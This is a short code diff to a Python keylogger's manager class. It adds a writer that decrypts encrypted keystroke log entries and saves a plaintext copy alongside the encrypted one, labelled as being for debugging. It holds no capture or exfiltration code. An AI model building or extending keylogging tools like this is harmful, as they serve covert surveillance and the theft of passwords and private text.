@@ -14,7 +14,7 @@ class KeyLoggerManager:
     - Writes logs to the specified log writer(s).
     """
 
-    def __init__(self, keylogger, log_writer, encrypted_log_writer, encryptor, interval=10):
+    def __init__(self, keylogger, log_writer, encrypted_log_writer, decrypted_log_writer, encryptor, interval=10):
         """
         Initializes the KeyLoggerManager.
 
@@ -27,7 +27,8 @@ class KeyLoggerManager:
         """
         self.keylogger = keylogger
         self.log_writer = log_writer
-        self.writer_for_encrypted_log = encrypted_log_writer
+        self.writer_for_encrypted_log = encrypted_log_writer  # for debugging reasons
+        self.writer_for_decrypted_log = decrypted_log_writer  # for debugging reasons
         self.encryptor = encryptor
         self.interval = interval
         self.running = False
@@ -62,6 +63,9 @@ class KeyLoggerManager:
         # Encrypt logs
         encrypted_logs = self.encryptor.get_encrypted_dict(self.encryptor.encrypt, log_entry)
 
+        decrypted_log = self.encryptor.get_encrypted_dict(self.encryptor.decrypt, encrypted_logs)
+
         # Write to log writers
         self.log_writer.write_log(log_entry)
         self.writer_for_encrypted_log.write_log(encrypted_logs)
+        self.writer_for_decrypted_log.write_log(decrypted_log)
